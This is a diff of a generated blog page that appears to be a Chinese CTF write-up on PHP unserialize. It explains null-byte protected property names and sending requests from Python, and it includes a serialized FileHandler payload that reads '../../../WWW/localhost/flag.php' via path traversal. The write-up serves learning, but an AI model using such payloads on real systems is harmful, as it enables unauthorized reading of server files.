@@ -529,7 +529,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-07-19
+                    2021-10-28
                 </div>
                 
 
@@ -590,14 +590,10 @@
 <pre class="line-numbers language-none"><code class="language-none">\x00*\x00变量名
 \0*\0变量名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-
-
 <p>然后要注意的是因为url解码会把这些字符转化掉，经测试谷歌浏览器和burpsuite都没办法正确传值，所以要用python发包</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//?str=\0*\0</span>
 <span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 什么都没有</span>
 <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// \0*\0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-
 
 <p>python发包代码</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
@@ -610,8 +606,6 @@ headers <span class="token operator">=</span> <span class="token punctuation">&#
 response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>
 
 <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
 
 <p>在这里又掉入了一个坑，平时写字符串都喜欢加个r，写什么是什么不让它自动转义，</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">url <span class="token operator">=</span> <span class="token string">r'http://localhost/test2.php/?str=O:11:"FileHandler":2:&#123;s:5:"\0*\0op";i:2;s:11:"\0*\0filename";s:31:"../../../WWW/localhost/flag.php";&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
